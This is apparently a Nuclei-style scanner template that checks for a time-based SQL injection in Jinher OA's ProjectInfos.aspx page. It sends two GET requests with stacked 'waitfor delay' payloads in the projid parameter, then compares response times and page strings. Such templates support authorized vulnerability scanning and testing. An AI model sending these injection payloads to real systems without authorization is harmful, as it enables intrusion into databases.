id: poc-yaml-jinher-jhsoft-projectinfos-aspx-sqli
info:
  name: 金和OA ProjectInfos.aspx SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: 金和OA
  metadata:
    product: 金和OA

http:
  - raw:
      - |
        GET /c6/JHSoft.Web.CostControl/BudgetExecution/ProjectInfos.aspx/?projid=1;waitfor+delay%270:0:5%27-- HTTP/1.1
        Host: {{Hostname}}
      - |
        GET /c6/JHSoft.Web.CostControl/BudgetExecution/ProjectInfos.aspx/?projid=1;waitfor+delay%270:0:8%27-- HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "项目明细信息"
          - "项目扩展信息"
          - "所属部门"
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
